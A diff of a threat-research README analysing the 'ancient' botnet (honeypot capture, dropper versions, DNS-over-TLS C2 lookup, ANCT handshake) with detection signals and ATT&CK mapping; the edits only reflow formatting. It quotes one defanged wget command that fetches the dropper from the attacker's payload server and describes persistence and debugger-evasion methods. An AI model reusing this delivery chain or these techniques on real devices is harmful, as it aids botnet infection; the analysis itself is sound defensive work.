@@ -2,19 +2,14 @@
 
 **KSI Digital threat research | first published 2026-10-05**
 
-We captured a botnet family that calls itself **"ancient"** in our SSH/Telnet honeypot. Between 2026-10-04 and 2026-10-05 we
-observed its delivery chain, three iterations of its dropper, and its C2 behaviour. We confirmed its C2 server live. We have not
-found a public write-up of this family, its markers, or its `ANCT` protocol tag. Several feeds currently tag its binaries as
-generic "Mirai", but its C2 protocol is not Mirai's.
+We captured a botnet family that calls itself **"ancient"** in our SSH/Telnet honeypot. Between 2026-10-04 and 2026-10-05 we observed its delivery chain, three iterations of its dropper, and its C2 behaviour. We confirmed its C2 server live. We have not found a public write-up of this family, its markers, or its `ANCT` protocol tag. Several feeds currently tag its binaries as generic "Mirai", but its C2 protocol is not Mirai's.
 
-All indicators are in [`iocs.csv`](iocs.csv). The three dropper versions are in [`dropper/`](dropper/), **defanged**: every
-line is commented out and network indicators are rewritten (`hxxp`, `[.]`). Bot binaries are not published here; use the
-SHA-256 hashes to retrieve them from your usual sample sharing platforms.
+All indicators are in [`iocs.csv`](iocs.csv). The three dropper versions are in [`dropper/`](dropper/), **defanged**: every line is commented out and network indicators are rewritten (`hxxp`, `[.]`). Bot binaries are not published here; use the SHA-256 hashes to retrieve them from your usual sample sharing platforms.
 
 ## Summary
 
-| | |
-|---|---|
+|  |  |
+| --- | --- |
 | Self-name | `ancient` (file `.ancient`, markers `ANCIENT_*`, protocol tag `ANCT`) |
 | Delivery | Telnet login by an already-infected device, then `wget` of a shell dropper |
 | Payload server | `89.163.157[.]131:8080` (AS24961, myLoc / WIIT AG, DE): `persist.sh` + 13 architecture builds |
@@ -40,7 +35,7 @@ flowchart LR
 ## Timeline (UTC)
 
 | Time | Event |
-|---|---|
+| --- | --- |
 | 2026-10-04 15:37 | `94.154.43[.]138` logs in over Telnet; fetches `persist.sh` v1 and the x86-64 bot `6c44cbf5...` |
 | 2026-10-04 (afternoon) | v2 of `persist.sh` served (duplicate-instance guard) |
 | 2026-10-04 19:09 | v3 served (durable-mount selection, port byte-order fix); x86-64 rebuild `748f50d4...` |
@@ -58,42 +53,28 @@ On 2026-10-04 at 15:37:39 UTC an infected device, `94.154.43[.]138`, logged in t
 cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget hxxp://89.163.157[.]131:8080/persist.sh ...
 ```
 
-Over the next four hours we logged 34 commands and downloads from that same device. It fetched three different versions
-of `persist.sh` and two builds of the x86-64 bot (`/x86_64`).
+Over the next four hours we logged 34 commands and downloads from that same device. It fetched three different versions of `persist.sh` and two builds of the x86-64 bot (`/x86_64`).
 
 ## 2. The dropper (`persist.sh`) and how it evolved
 
-The script opens with `# ancient telnet persistence payload - PURE ASCII ONLY`, with a note that old BusyBox shells
-mishandle multi-byte UTF-8. It maps `uname -m` to one of 13 builds (`arm4`-`arm8`, `mips`, `mpsl`, `x86`, `x86_64`,
-`m68k`, `ppc`, `sh4`). It then tries `wget`, `busybox wget`, `curl`, `busybox curl` and `toybox wget` in turn. It saves
-the result as a hidden `.ancient` file, accepts it only if larger than 100 KB, launches it detached (`setsid` or `nohup`),
-and adds persistence. Finally it reports one of `ANCIENT_STARTED`, `ANCIENT_NOCONN`, `ANCIENT_SKIP` or `ANCIENT_FAIL`
-back to the loader.
+The script opens with `# ancient telnet persistence payload - PURE ASCII ONLY`, with a note that old BusyBox shells mishandle multi-byte UTF-8. It maps `uname -m` to one of 13 builds (`arm4`-`arm8`, `mips`, `mpsl`, `x86`, `x86_64`, `m68k`, `ppc`, `sh4`). It then tries `wget`, `busybox wget`, `curl`, `busybox curl` and `toybox wget` in turn. It saves the result as a hidden `.ancient` file, accepts it only if larger than 100 KB, launches it detached (`setsid` or `nohup`), and adds persistence. Finally it reports one of `ANCIENT_STARTED`, `ANCIENT_NOCONN`, `ANCIENT_SKIP` or `ANCIENT_FAIL` back to the loader.
 
 | Version | SHA-256 | Change |
-|---|---|---|
+| --- | --- | --- |
 | v1 (2802 B) | `5e6c8302...be76c8` | install to the first writable dir; cron + rc.local + init.d |
 | v2 (3380 B) | `659742f1...f23d6bea` | refuses to start a second copy ("make the C2 thrash closing same-IP connections") |
 | v3 (5952 B) | `ac62a1df...aed4b592f` | scores `/proc/mounts` to pick a reboot-durable filesystem; adds `/etc/crontab`, `/var/spool/cron/root`, `profile.d`; **fixes a byte-order bug** |
 
-The byte-order fix shows the authors are testing against real devices. After launch, every version checks
-`/proc/net/tcp` for an open connection on the C2 port 35342 (`0x8A0E`). v1 and v2 searched for `:0E8A`. That's wrong:
-the kernel prints ports in host order, so these versions always reported `ANCIENT_NOCONN`. v3 searches for `:8A0E` and
-explains the fix in a comment. v3 also cites a "reference TELNET_PERSIST_PAYLOAD.sh" for its directory-scoring logic.
+The byte-order fix shows the authors are testing against real devices. After launch, every version checks `/proc/net/tcp` for an open connection on the C2 port 35342 (`0x8A0E`). v1 and v2 searched for `:0E8A`. That's wrong: the kernel prints ports in host order, so these versions always reported `ANCIENT_NOCONN`. v3 searches for `:8A0E` and explains the fix in a comment. v3 also cites a "reference TELNET_PERSIST_PAYLOAD.sh" for its directory-scoring logic.
 
 ## 3. C2 discovery and anti-analysis
 
-We ran the x86-64 build (`6c44cbf5...`) in an isolated sandbox whose router logs all traffic and blocks everything not
-explicitly allowed.
+We ran the x86-64 build (`6c44cbf5...`) in an isolated sandbox whose router logs all traffic and blocks everything not explicitly allowed.
 
-- **Traced runs** (strace, 10-25 min): no network activity until the tracer detached at the end of the run. The bot
-  appears to stay idle while being ptraced.
-- **Untraced run**, with only Cloudflare DoT (`1.1.1.1:853`) allowed: the bot immediately resolved `zyrec2.duckdns[.]org`.
-  It made 32 DoT connections plus 6 plain-DNS queries for the same name, then made 33 connection attempts to
-  `89.163.157[.]131:35342`. The router blocked them all.
+- **Traced runs** (strace, 10-25 min): no network activity until the tracer detached at the end of the run. The bot appears to stay idle while being ptraced.
+- **Untraced run**, with only Cloudflare DoT (`1.1.1.1:853`) allowed: the bot immediately resolved `zyrec2.duckdns[.]org`. It made 32 DoT connections plus 6 plain-DNS queries for the same name, then made 33 connection attempts to `89.163.157[.]131:35342`. The router blocked them all.
 
-Resolving the C2 name over DNS-over-TLS hides it from network monitoring that relies on port-53 DNS logs. A resolver
-sinkhole or a DNS log will only show a TLS session to a public resolver.
+Resolving the C2 name over DNS-over-TLS hides it from network monitoring that relies on port-53 DNS logs. A resolver sinkhole or a DNS log will only show a TLS session to a public resolver.
 
 ## 4. The `ANCT` protocol
 
@@ -106,34 +87,26 @@ C2  -> bot 36 B   high-entropy  (32 B + 4 B)
 bot -> C2  ...    encrypted stream
 ```
 
-The server completed the handshake and kept the session open for the full 10 minutes, which confirms a live C2. During
-that window it sent nothing beyond its 36-byte reply, so no tasking was observed. The bot uploaded about **1.79 MB** in
-2,785 packets (mostly 734-byte segments); the content is encrypted and unknown. `ANCT` reads as an abbreviation of
-"ANCienT", matching the dropper's naming.
+The server completed the handshake and kept the session open for the full 10 minutes, which confirms a live C2. During that window it sent nothing beyond its 36-byte reply, so no tasking was observed. The bot uploaded about **1.79 MB** in 2,785 packets (mostly 734-byte segments); the content is encrypted and unknown. `ANCT` reads as an abbreviation of "ANCienT", matching the dropper's naming.
 
 ## 5. Detection ideas
 
-Ready-to-use rules are in [`detection/`](detection/): a YARA rule for the dropper (tested, no false positives across
-~500 honeypot samples), Suricata rules for the `ANCT` handshake and the C2/payload endpoints, and a Sigma rule for the
-host persistence artifacts. The signals those rules encode:
+Ready-to-use rules are in [`detection/`](detection/): a YARA rule for the dropper (tested, no false positives across ~500 honeypot samples), Suricata rules for the `ANCT` handshake and the C2/payload endpoints, and a Sigma rule for the host persistence artifacts. The signals those rules encode:
 
 - Outbound TCP whose first 4 payload bytes are `ANCT`, especially to port 35342.
 - IoT or embedded devices making DNS-over-TLS (`:853`) connections to public resolvers.
-- Files named `.ancient` anywhere, `/etc/init.d/.ancient`, `/etc/profile.d/.ancient.sh`, and cron lines
-  `*/5 * * * * <path>/.ancient`.
+- Files named `.ancient` anywhere, `/etc/init.d/.ancient`, `/etc/profile.d/.ancient.sh`, and cron lines `*/5 * * * * <path>/.ancient`.
 - The strings `ANCIENT_STARTED` / `ANCIENT_NOCONN` / `ANCIENT_SKIP` / `ANCIENT_FAIL` in Telnet session output.
 
 ## 6. Open questions
 
 - The key exchange and cipher behind the `ANCT` handshake.
 - What the bot uploads (about 1.8 MB in 10 minutes with no instructions from the server).
-- The relation between this campaign and the older use of `zyrec2.duckdns[.]org`, which ThreatFox lists as a Mirai C2
-  since 2026-06.
+- The relation between this campaign and the older use of `zyrec2.duckdns[.]org`, which ThreatFox lists as a Mirai C2 since 2026-06.
 
 ## MITRE ATT&CK
 
-T1105 Ingress Tool Transfer | T1053.003 Cron | T1037.004 RC Scripts | T1546.004 Unix Shell Configuration Modification |
-T1564.001 Hidden Files | T1071.004 Application Layer Protocol: DNS | T1573 Encrypted Channel | T1622 Debugger Evasion
+T1105 Ingress Tool Transfer | T1053.003 Cron | T1037.004 RC Scripts | T1546.004 Unix Shell Configuration Modification | T1564.001 Hidden Files | T1071.004 Application Layer Protocol: DNS | T1573 Encrypted Channel | T1622 Debugger Evasion
 
 ## Reporting status
 
@@ -144,9 +117,7 @@ T1564.001 Hidden Files | T1071.004 Application Layer Protocol: DNS | T1573 Encry
 
 ## Method and handling
 
-Samples were captured by a Cowrie honeypot and analysed in an isolated Hyper-V lab. The lab's egress is fail-closed through
-a WireGuard tunnel, and only the destinations listed above were reachable during each run. The C2 was contacted once, for
-10 minutes, solely to confirm it was live. Nothing was sent to it other than what the bot itself sent.
+Samples were captured by a Cowrie honeypot and analysed in an isolated Hyper-V lab. The lab's egress is fail-closed through a WireGuard tunnel, and only the destinations listed above were reachable during each run. The C2 was contacted once, for 10 minutes, solely to confirm it was live. Nothing was sent to it other than what the bot itself sent.
 
 Contact: christophe@ksi-digital.com | abuse.ch `@ksi_digital`
 
